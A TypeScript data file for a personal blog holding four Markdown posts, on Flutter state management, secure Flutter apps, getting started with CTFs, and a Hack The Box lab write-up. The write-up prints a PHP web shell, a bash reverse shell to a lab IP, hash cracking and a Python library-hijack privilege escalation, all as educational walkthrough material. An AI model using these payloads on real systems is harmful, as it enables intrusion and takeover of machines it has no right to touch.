export interface BlogPost {
  slug: string;
  title: string;
  excerpt: string;
  date: string;
  category: "dev" | "security";
  tags: string[];
  readTime: string;
  coverImage?: string;
  content: string;
}

export const blogPosts: BlogPost[] = [
  {
    slug: "flutter-state-management-2024",
    title: "Flutter State Management in 2024: What I Actually Use",
    excerpt: "A practical breakdown of state management solutions in Flutter — from Provider to Riverpod and beyond.",
    date: "2024-12-15",
    category: "dev",
    tags: ["Flutter", "Dart", "State Management"],
    readTime: "5 min",
    content: `
# Flutter State Management in 2024: What I Actually Use

State management is one of the most debated topics in the Flutter community. After building production apps for over two years, here's my honest take on what actually works.

## The Problem

Every Flutter developer faces this question early on: *How do I manage state across my app?* The answer isn't straightforward because it depends on your app's complexity, team size, and personal preferences.

## What I've Tried

### Provider

Provider was my first real state management solution. It's simple, well-documented, and officially recommended by the Flutter team.

\`\`\`dart
class CounterProvider extends ChangeNotifier {
  int _count = 0;
  int get count => _count;

  void increment() {
    _count++;
    notifyListeners();
  }
}
\`\`\`

**Pros:** Easy to learn, great documentation
**Cons:** Can get messy in large apps, boilerplate for complex state

### Riverpod

Riverpod is what I currently use for most projects. It fixes many of Provider's limitations while keeping the mental model familiar.

\`\`\`dart
final counterProvider = StateNotifierProvider<CounterNotifier, int>((ref) {
  return CounterNotifier();
});

class CounterNotifier extends StateNotifier<int> {
  CounterNotifier() : super(0);
  void increment() => state++;
}
\`\`\`

**Pros:** Compile-time safety, no BuildContext dependency, great testing support
**Cons:** Steeper learning curve, syntax can feel verbose

### BLoC

I used BLoC for a large enterprise project. It's powerful but often overkill for smaller apps.

\`\`\`dart
class CounterBloc extends Bloc<CounterEvent, int> {
  CounterBloc() : super(0) {
    on<Increment>((event, emit) => emit(state + 1));
  }
}
\`\`\`

## My Recommendation

For most projects in 2024, **Riverpod** is my go-to. Here's why:

1. **Type safety** — Catches errors at compile time
2. **Testability** — Easy to mock and test providers
3. **Scalability** — Works well from small to large apps
4. **No context issues** — Access state anywhere without BuildContext

## When to Use What

| Solution | Best For |
|----------|----------|
| \`setState\` | Simple, local state |
| Provider | Small to medium apps |
| Riverpod | Medium to large apps |
| BLoC | Enterprise, complex event flows |

## Conclusion

Don't overthink it. Start with \`setState\` for local state, and reach for Riverpod when you need shared state. The best state management solution is the one your team understands and can maintain.

> "The best architecture is the one you can actually maintain." — Every senior developer ever
`,
  },
  {
    slug: "htb-writeup-machine",
    title: "HTB Writeup: Pwning a Medium Box",
    excerpt: "Step-by-step walkthrough of a Hack The Box machine involving privilege escalation and lateral movement.",
    date: "2024-11-28",
    category: "security",
    tags: ["HTB", "Penetration Testing", "Linux", "Privilege Escalation"],
    readTime: "8 min",
    content: `
# HTB Writeup: Pwning a Medium Box

This is a walkthrough of a medium-difficulty Hack The Box machine that involves web enumeration, a custom exploit, and a clever privilege escalation chain.

> ⚠️ **Disclaimer:** This writeup is for educational purposes only. Always practice ethical hacking on authorized systems.

## Reconnaissance

### Nmap Scan

Starting with a comprehensive port scan:

\`\`\`bash
nmap -sC -sV -oN nmap/initial 10.10.10.xxx
\`\`\`

**Results:**
- Port 22: OpenSSH 8.2
- Port 80: Apache 2.4.41
- Port 3306: MySQL 8.0

### Web Enumeration

The web application is running a custom PHP application. Using \`gobuster\` to find hidden directories:

\`\`\`bash
gobuster dir -u http://10.10.10.xxx -w /usr/share/wordlists/dirb/common.txt
\`\`\`

Found an interesting \`/admin\` panel and a \`/backup\` directory containing a database dump.

## Initial Foothold

The database dump contained hashed credentials:

\`\`\`
admin:$2b$12$LJ3m4ys3Lk0TdPHvCkh8xO...
\`\`\`

After cracking with \`hashcat\`:

\`\`\`bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
\`\`\`

Got the admin password and logged into the panel.

## Exploitation

The admin panel had a file upload feature vulnerable to unrestricted file upload. Uploaded a PHP reverse shell:

\`\`\`php
<?php system($_GET['cmd']); ?>
\`\`\`

\`\`\`bash
curl "http://10.10.10.xxx/uploads/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data)
\`\`\`

Got a proper reverse shell using:

\`\`\`bash
bash -c 'bash -i >& /dev/tcp/10.10.14.xxx/4444 0>&1'
\`\`\`

## Privilege Escalation

### From www-data to user

Found MySQL credentials in the web app config:

\`\`\`bash
cat /var/www/html/config.php
# DB_PASSWORD=s3cur3_p@ss
\`\`\`

The password was reused for the \`developer\` user account. SSH'd in successfully.

### From user to root

Running \`sudo -l\` revealed:

\`\`\`bash
(root) NOPASSWD: /usr/bin/python3 /opt/scripts/backup.py
\`\`\`

The backup script imported a module from a writable directory. Classic **Python library hijacking**:

\`\`\`python
# /opt/scripts/utils.py (writable!)
import os
os.system('/bin/bash')
\`\`\`

\`\`\`bash
sudo /usr/bin/python3 /opt/scripts/backup.py
# root@box:~#
\`\`\`

## Key Takeaways

1. **Always check for credential reuse** — It's still one of the most common vulnerabilities
2. **File upload restrictions matter** — Validate file types server-side
3. **Python path hijacking** is a powerful privesc technique
4. **Database backups** should never be publicly accessible

## Tools Used

- \`nmap\` — Port scanning
- \`gobuster\` — Directory enumeration
- \`hashcat\` — Password cracking
- \`netcat\` — Reverse shell listener
`,
  },
  {
    slug: "secure-flutter-apps",
    title: "Building Secure Flutter Apps: Common Pitfalls",
    excerpt: "Security best practices for Flutter developers — from API key management to certificate pinning.",
    date: "2024-10-10",
    category: "dev",
    tags: ["Flutter", "Security", "Mobile Development"],
    readTime: "6 min",
    content: `
# Building Secure Flutter Apps: Common Pitfalls

As a Flutter developer with a cybersecurity background, I see security mistakes in mobile apps all the time. Here are the most common pitfalls and how to avoid them.

## 1. Hardcoding API Keys

This is the #1 mistake I see. Never hardcode API keys or secrets in your Dart code.

\`\`\`dart
// ❌ DON'T DO THIS
const apiKey = "sk-1234567890abcdef";

// ✅ DO THIS - Use environment variables
const apiKey = String.fromEnvironment('API_KEY');
\`\`\`

Even with obfuscation, hardcoded strings can be extracted from APK/IPA files using tools like \`apktool\` or \`strings\`.

### Better Approach

Use \`flutter_dotenv\` for development and secure storage for production:

\`\`\`dart
import 'package:flutter_dotenv/flutter_dotenv.dart';

await dotenv.load();
final apiKey = dotenv.env['API_KEY'];
\`\`\`

## 2. Ignoring Certificate Pinning

Without certificate pinning, your app is vulnerable to man-in-the-middle attacks.

\`\`\`dart
// Implement certificate pinning with dio
final dio = Dio();
(dio.httpClientAdapter as DefaultHttpClientAdapter).onHttpClientCreate = (client) {
  client.badCertificateCallback = (cert, host, port) {
    // Verify certificate fingerprint
    return cert.sha256 == expectedFingerprint;
  };
};
\`\`\`

## 3. Insecure Local Storage

Using \`SharedPreferences\` for sensitive data is a security risk. Use \`flutter_secure_storage\` instead:

\`\`\`dart
// ❌ Insecure
final prefs = await SharedPreferences.getInstance();
prefs.setString('token', authToken);

// ✅ Secure
final storage = FlutterSecureStorage();
await storage.write(key: 'token', value: authToken);
\`\`\`

## 4. Not Obfuscating Release Builds

Always enable obfuscation for release builds:

\`\`\`bash
flutter build apk --obfuscate --split-debug-info=debug-info/
\`\`\`

## 5. Logging Sensitive Data

Remove all debug logs before release:

\`\`\`dart
// Use a custom logger that's disabled in release
import 'package:flutter/foundation.dart';

void log(String message) {
  if (kDebugMode) {
    print(message);
  }
}
\`\`\`

## Security Checklist

- [ ] No hardcoded secrets in source code
- [ ] Certificate pinning implemented
- [ ] Secure storage for sensitive data
- [ ] Code obfuscation enabled
- [ ] No sensitive data in logs
- [ ] Root/jailbreak detection
- [ ] Biometric authentication for sensitive actions
- [ ] Input validation on all user inputs

## Conclusion

Security isn't an afterthought — it should be part of your development process from day one. As mobile developers, we have a responsibility to protect our users' data.

> Start with the basics: secure storage, certificate pinning, and never hardcode secrets. These three alone will put you ahead of 90% of apps out there.
`,
  },
  {
    slug: "ctf-beginner-guide",
    title: "Getting Started with CTFs: A Beginner's Guide",
    excerpt: "Everything you need to know to start your capture-the-flag journey — tools, platforms, and mindset.",
    date: "2024-09-05",
    category: "security",
    tags: ["CTF", "Cybersecurity", "Beginner", "Hacking"],
    readTime: "7 min",
    content: `
# Getting Started with CTFs: A Beginner's Guide

Capture The Flag (CTF) competitions are one of the best ways to learn cybersecurity hands-on. Here's everything you need to get started.

## What Are CTFs?

CTFs are cybersecurity competitions where participants solve security-related challenges to find hidden "flags" — usually strings like \`flag{th1s_1s_a_fl4g}\`.

### Types of CTFs

1. **Jeopardy** — Solve individual challenges across categories
2. **Attack-Defense** — Defend your services while attacking others
3. **King of the Hill** — Maintain control of a target machine

## Essential Categories

### Web Exploitation
Understanding web vulnerabilities is crucial:

\`\`\`
- SQL Injection
- Cross-Site Scripting (XSS)
- Server-Side Request Forgery (SSRF)
- File inclusion vulnerabilities
\`\`\`

### Cryptography
Break or exploit cryptographic systems:

\`\`\`python
# Simple Caesar cipher decoder
def caesar_decode(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            ascii_offset = ord('a') if char.islower() else ord('A')
            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)
        else:
            result += char
    return result

# Try all shifts
for i in range(26):
    print(f"Shift {i}: {caesar_decode('Khoor Zruog', i)}")
\`\`\`

### Forensics
Analyze files, memory dumps, and network captures:

\`\`\`bash
# Check file type
file mystery_file

# Extract strings
strings mystery_file | grep "flag"

# Analyze with binwalk
binwalk -e mystery_file
\`\`\`

### Reverse Engineering
Understand how programs work:

\`\`\`bash
# Disassemble with objdump
objdump -d binary

# Use Ghidra for decompilation
ghidraRun
\`\`\`

## Recommended Platforms

| Platform | Level | Focus |
|----------|-------|-------|
| [PicoCTF](https://picoctf.org) | Beginner | All categories |
| [TryHackMe](https://tryhackme.com) | Beginner-Intermediate | Guided learning |
| [Hack The Box](https://hackthebox.com) | Intermediate-Advanced | Real-world scenarios |
| [CTFtime](https://ctftime.org) | All levels | Competition calendar |

## Essential Tools

\`\`\`bash
# Must-have tools
sudo apt install -y \\
  nmap \\
  gobuster \\
  john \\
  hashcat \\
  binwalk \\
  steghide \\
  wireshark \\
  burpsuite \\
  gdb \\
  python3-pip

# Python libraries
pip3 install pwntools requests beautifulsoup4 pycryptodome
\`\`\`

## Tips for Beginners

1. **Start easy** — Don't jump into hard challenges immediately
2. **Read writeups** — Learn from others' solutions after trying yourself
3. **Take notes** — Document everything you learn
4. **Join a team** — Collaboration accelerates learning
5. **Practice regularly** — Consistency beats intensity

## My CTF Setup

I use a dedicated Kali Linux VM with:
- Custom aliases for common tools
- Pre-configured wordlists
- Automated recon scripts
- Organized workspace structure

\`\`\`bash
# My .bashrc additions
alias serve='python3 -m http.server 8000'
alias listen='nc -lvnp'
alias scan='nmap -sC -sV -oN scan.txt'
\`\`\`

## Conclusion

CTFs are addictive in the best way possible. Start with beginner-friendly platforms, be patient with yourself, and remember — every expert was once a beginner.

> "The quieter you become, the more you can hear." — BackTrack Linux motto
`,
  },
];

export const getBlogBySlug = (slug: string) => blogPosts.find((p) => p.slug === slug);

export const getAllTags = () => {
  const tags = new Set<string>();
  blogPosts.forEach((post) => post.tags.forEach((tag) => tags.add(tag)));
  return Array.from(tags);
};
